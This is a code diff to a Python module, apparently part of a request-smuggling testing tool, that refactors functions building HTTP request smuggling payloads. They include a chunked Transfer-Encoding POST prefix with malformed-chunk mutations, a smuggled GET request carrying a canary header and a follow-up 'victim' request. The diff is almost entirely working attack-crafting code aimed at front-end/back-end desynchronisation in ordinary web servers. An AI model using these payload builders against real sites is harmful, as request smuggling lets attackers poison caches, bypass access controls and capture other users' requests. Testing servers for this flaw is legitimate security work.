@@ -1,5 +1,3 @@
-"""Funky Chunks mutation generators with expanded coverage."""
-
 from typing import Dict
 
 
@@ -33,14 +31,37 @@ def funky_chunk_mutations() -> Dict[str, str]:
     }
 
 
-def build_funky_payload(mutation: str, endpoint: str, host_header: str,
-                        canary_path: str) -> bytes:
-    smuggled = (
+def build_funky_smuggled(host_header: str, canary_path: str) -> str:
+    return (
         f"GET {canary_path} HTTP/1.1\r\n"
         f"Host: {host_header}\r\n"
         f"X-FunkyCanary: true\r\n"
         f"\r\n"
     )
+
+
+def build_funky_victim(endpoint: str, host_header: str) -> bytes:
+    return (
+        f"GET {endpoint}?victim=1 HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        f"\r\n"
+    ).encode("latin-1")
+
+
+def build_funky_prefix(mutation: str, endpoint: str, host_header: str) -> bytes:
+    payload = (
+        f"POST {endpoint} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        f"Transfer-Encoding: chunked\r\n"
+        f"\r\n"
+        f"{mutation}"
+    )
+    return payload.encode("latin-1", errors="replace")
+
+
+def build_funky_payload(mutation: str, endpoint: str, host_header: str,
+                        canary_path: str) -> bytes:
+    smuggled = build_funky_smuggled(host_header, canary_path)
     payload = (
         f"POST {endpoint} HTTP/1.1\r\n"
         f"Host: {host_header}\r\n"
@@ -48,7 +69,5 @@ def build_funky_payload(mutation: str, endpoint: str, host_header: str,
         f"\r\n"
         f"{mutation}"
         f"{smuggled}"
-        f"0\r\n"
-        f"\r\n"
     )
     return payload.encode("latin-1", errors="replace")
